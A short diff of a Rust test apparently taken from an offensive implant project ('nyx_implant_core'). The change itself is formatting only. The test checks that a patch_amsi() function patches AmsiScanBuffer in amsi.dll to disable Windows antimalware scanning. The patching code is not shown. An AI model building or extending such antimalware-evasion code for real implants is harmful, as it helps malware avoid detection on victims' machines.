@@ -383,9 +383,8 @@ mod tests {
     /// loaded (host already pulled it in), the patch lands and verifies.
     #[test]
     fn patch_amsi_gating_matches_resolver_state() {
-        let resolved = unsafe {
-            nyx_implant_core::resolve::export_addr(b"amsi.dll", b"AmsiScanBuffer")
-        };
+        let resolved =
+            unsafe { nyx_implant_core::resolve::export_addr(b"amsi.dll", b"AmsiScanBuffer") };
         let r = unsafe { patch_amsi() };
         match resolved {
             None => assert_eq!(r, Err("amsi not loaded")),
